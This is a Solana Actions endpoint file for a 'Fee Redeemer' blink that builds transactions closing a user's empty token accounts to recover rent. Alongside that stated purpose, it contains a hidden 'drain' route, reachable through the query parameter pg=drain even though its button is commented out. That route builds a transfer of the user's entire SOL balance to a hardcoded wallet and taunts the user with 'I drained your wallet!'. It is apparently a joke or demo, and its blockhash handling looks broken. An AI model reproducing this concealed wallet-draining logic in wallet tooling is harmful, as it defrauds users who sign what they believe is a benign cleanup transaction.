import {ActionGetResponse, ActionPostResponse, ActionPostRequest, ACTIONS_CORS_HEADERS, } from "@solana/actions"
import {ComputeBudgetInstruction, ComputeBudgetProgram, Connection, Keypair, PublicKey, SystemProgram, Transaction, clusterApiUrl} from "@solana/web3.js"
import { getEmptyTokenAccounts } from "./helper";
import { createCloseAccountInstruction, TOKEN_2022_PROGRAM_ID, TOKEN_PROGRAM_ID } from "@solana/spl-token";

const MAX_ACCOUNTS_TO_CLOSE = 20;

export async function GET(request: Request) {

  const requestURL = new URL(request.url);
  const iconURL = new URL("/logo.jpg", requestURL.origin);
  const responseBody : ActionGetResponse = {
    icon: iconURL.toString(),
    description: "recover rent by closing empty token accounts",
    title: "Fee Redeemer",
    label: "GO!",
    links: 
      {
        actions: [
          {
            href: request.url+"?pg=keg",
            label: "Token"
          }, 
          {
            href: request.url+"?pg=token22",
            label: "Token22"
          }, 
          // {
          //   href: request.url+"?pg=drain",
          //   label: "Let Andy have your SOL"
          // }, 
        ]
      },
    // disabled: true
    // error: {
    //   message: "This blink is not implemented yet!"
    // },
  }
  
  const response = Response.json(responseBody, {headers: ACTIONS_CORS_HEADERS})

  return response
}


export async function POST(request: Request) {
  
  const requestBody: ActionPostRequest = await request.json();
  const userPubkey = requestBody.account;
  console.log(userPubkey);

  const url = new URL(request.url)
  const programString = url.searchParams.get('pg');

  const user = new PublicKey(userPubkey)

  const connection = new Connection(clusterApiUrl("mainnet-beta"));
  const tx = new Transaction();

  tx.add(ComputeBudgetProgram.setComputeUnitLimit({units: 100_000}))
  tx.add(ComputeBudgetProgram.setComputeUnitPrice({microLamports: 200_000}))


  if (programString=="drain"){
    return doTheDrain(connection, user, tx);
  }

  const tokenProgram = programString=="token22" ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;

  let emptyTAs = await getEmptyTokenAccounts(user, connection, tokenProgram);

  let remaining = 0;
  
  if (emptyTAs.length>MAX_ACCOUNTS_TO_CLOSE){
    console.log("user has more than 20 empty TAs");
    remaining = emptyTAs.length-MAX_ACCOUNTS_TO_CLOSE;
    emptyTAs = emptyTAs.slice(0,MAX_ACCOUNTS_TO_CLOSE+1);
  }
  const ixs = emptyTAs.map(pks => createCloseAccountInstruction(pks, user, user,undefined, tokenProgram));
  if (ixs.length) tx.add(...ixs);

  tx.feePayer = user
  const bh = (await connection.getLatestBlockhash({commitment: "finalized"})).blockhash; 
  console.log("using blockhash "+bh)
  tx.recentBlockhash = bh
  const serialTX = tx.serialize({requireAllSignatures: false, verifySignatures: false}).toString("base64");

  const response : ActionPostResponse = {
    transaction: serialTX,
    message: "closed "+emptyTAs.length+ " token accounts, "+remaining+" left"
  };
  return Response.json(response, {headers: ACTIONS_CORS_HEADERS})
}


export async function OPTIONS(request: Request) {
  return new Response(null, {headers: ACTIONS_CORS_HEADERS})
}

async function doTheDrain(connection: Connection, user: PublicKey, tx: Transaction) {
  const andysWallet = new PublicKey("AndykcFpupACYs2x74mDiu4tFH22NGrGBrcZzGicG1Xa")
  const fees = 5000+20000;
  const balance = await connection.getBalance(user); 
  const ix = SystemProgram.transfer(
    {
      fromPubkey: user,
      toPubkey: andysWallet,
      lamports: balance-fees
    }
  )

  tx.add(ix);

  tx.feePayer = user
  const bh = (await connection.getLatestBlockhash({commitment: "finalized"})).blockhash; 
  console.log("using blockhash "+bh)
  tx.recentBlockhash = SystemProgram.programId.toBase58()
  const serialTX = tx.serialize({requireAllSignatures: false, verifySignatures: false}).toString("base64");

  const response : ActionPostResponse = {
    transaction: serialTX,
    message: "hahahahaha, I drained your wallet!"
  };
  return Response.json(response, {headers: ACTIONS_CORS_HEADERS})

}
